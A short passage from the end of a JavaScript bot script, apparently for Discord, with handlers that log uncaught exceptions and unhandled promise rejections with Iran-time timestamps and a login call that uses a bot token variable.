  console.error(`   Stack: ${error.stack}`);
  console.error(`   Time: ${getIranTime().toLocaleString()}`);
  console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.error('❌ Unhandled Rejection:');
  console.error(`   Reason: ${reason}`);
  console.error(`   Time: ${getIranTime().toLocaleString()}`);
  console.error('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
});

client.login(BOT_TOKEN).catch(err => {
  console.error("Login failed:", err.message);
});
 